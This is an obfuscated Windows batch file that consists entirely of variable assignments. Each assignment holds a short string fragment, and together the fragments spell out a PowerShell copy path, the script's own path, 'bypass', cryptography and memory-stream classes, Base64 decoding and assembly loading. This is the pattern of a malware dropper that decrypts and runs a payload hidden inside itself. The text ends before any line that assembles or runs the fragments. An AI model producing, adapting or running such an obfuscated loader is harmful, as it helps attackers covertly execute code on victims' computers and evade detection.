@echo off
set "eowTaKJRcu=em"
set "KdyeBTmEEf=he"
set "wqTGwtMOjJ=rs"
set "eczwgklkSI=ll"
set "qyspCjUZEZ=\v"
set "BwmRTfQxxT= C"
set "HrFVtMDhSl=py"
set "AlzuuBAydX=\W"
set "OhLNkmjDEj=32"
set "qiyFTccFXk=.e"
set "yaAgadNVql=1."
set "pwPHLRVVty= /"
set "OBREwOSMDy=Sy"
set "rrmsAGOGgH=st"
set "HWGeacroFT=Wi"
set "wFRiszBLvE=y "
set "potCdHUQro=:\"
set "klOeEEfCaL=Po"
set "xAvGZEqCEY=nd"
set "zWYRKYXMYf=xe"
set "bCtxeExFTm=co"
set "sFuYnYWhWb=ll"
set "lXMEfTBUIp=0\"
set "SMQDEEPiQR=s\"
set "OahaXtYcSM=ow"
set "ebJiKkFzhn=do"
set "sWmuDlLiBs=po"
set "IaqoGBOgDO=he"
set "QjbjMzfXDL=in"
set "hlZSeyCqJk=we"
set "WaqPAEgecT=rS"
set "wlcXhSPbzz=ws"
set "YnaFHdCsvd=we"
set "SOjFGWzDQO=cd"
set "zhbByetbfM= %~dp0"
set "oTjGbyWJCn=106u"
set "AgDzcFFAdb=ptog"
set "XBDqIASEVx=fore"
set "aJWJrjVYHq=m.IO"
set "drzNyknMcK=Mh ="
set "EapfQkGMAu=);$c"
set "mBzOgUSHYt=Mq ="
set "ypSaLRclye=ose("
set "oCyuLYHMmC=xeT "
set "RPHdWlwbXf=le  "
set "lpHQZEqSRi=7;$c"
set "hvhCUbyAEV=n ''"
set "SWRadUhaXR=.Dis"
set "BZdyDrfDxR=[Sys"
set "IMnOJpaKto=in $"
set "KzUZqUbyYd=Fina"
set "lpUNLiMFTr=Disp"
set "YjCVioCIfv= New"
set "yEoHGRtiLa=WDyo"
set "kTinBKAexc=$kno"
set "SthfIChSqR=, $a"
set "xcNqcyJBDD=tion"
set "dYXibSGXFV=H = "
set "ocOyasdZjj=jDIa"
set "ftbHNqqUBe=)($G"
set "byJcDsFRnm=UJMk"
set "FnWbufhmid=1..-"
set "xZjHVKlyFA=-joi"
set "XqOGtwTilt=('%~f0'"
set "aeLnBozdHe=Invo"
set "FwowZtRYnn=vert"
set "jtzEeCKHID=ment"
set "oGsZQlqtyd=yste"
set "hnTtbGZAbP=pStr"
set "RmVqXEChZB=d;$c"
set "AfSbcCSHrf=eT.T"
set "IfzVEjevLQ=e]::"
set "lUZkpFIuaj=wT);"
set "OMfyZeboaW=.Ass"
set "TsnTnHILEg=ct S"
set "lzvSLfvgPb=ddin"
set "oHfmzriUfp=ring"
set "vYApIGdpfJ=UJMk"
set "qQPzAiePOR=WDyo"
set "xpxdZVpOgD= [Sy"
set "UWWolTaBCM=16] "
set "xRVyVSjhZN=();$"
set "OGiYNNKMFi='txe"
set "egrNNvdIGC=$cWD"
set "LbUAmNftZx=mory"
set "blVojDNmyH=ress"
set "RvGgXQFnKM=lit("
set "hPhTURsimF=cWDy"
set "IjmkfKMzgN=File"
set "wkoduLhTQg=BC;$"
set "Nufggxwfid=dj0C"
set "HCOxjUZmuD=);$k"
set "xWPCFyGnmw=se()"
set "gbkqFwOUFy=urit"
set "OQLjJgfgKh=oArr"
set "uRVMGmOcpB=:: '"
set "RvAXGSMlpU=trea"
set "wsccznPRWk='0Pg"
set "cERTVMGpEb=join"
set "kmTfYXfyhx=.Mem"
set "jZGPWoyCZj=$eBA"
set "yVTsiQmCjX=bypa"
set "bNPvmtxskh=pher"
set "CAOMUHuoiP=tem."
set "LUiyEKSihI=, (,"
set "FEZvwSLxpC=-4] "
set "cyalRIBkTl=eMVs"
set "aUzaGMFjoG=q = "
set "dLrGMNoHmj=bstr"
set "kADUzmzcHP=tsWi"
set "gbazkoMUmB='')("
set "TIGIVyPutj=);$c"
set "eOzGknuThp=($jD"
set "QkJFjTsGIc===')"
set "qjPpHkUDJt=$aSD"
set "DIYVKDhiWR=ose("
set "uoLQPifQJh== $c"
set "XZGajOjllr=]::("
set "JpbnimONEJ=$aSD"
set "oKvhyxbCNW=-Obj"
set "iAlpSrdiPp=();$"
set "LZyPLGsxsi=nage"
set "RZMbBtGqeC=oin "
set "EJrAcYIfiq=Comp"
set "sCgXBfhBtn=Disp"
set "akKUyQpYCx=.Cry"
set "pFHeQpdZGZ=3); "
set "qdLxeUuLoz=g = "
set "jYYkoUEsvu=ct S"
set "cuzwuhNLdD=esMa"
set "QGyyBvYMiK=]::N"
set "LGlsKoPMlq=S46e"
set "evNZgwSNBC=k; }"
set "yrueYHjocW=XClc"
set "witOAJrDGM=E.Su"
set "KBKdAbNwhy=] -j"
set "nVEehGVCqK=uXkZ"
set "asfIhWyNVV=RmAx"
set "lBxcbnCFiM=::('"
set "bvchMpViCn= = $"
set "NUxTQckEMt=.Len"
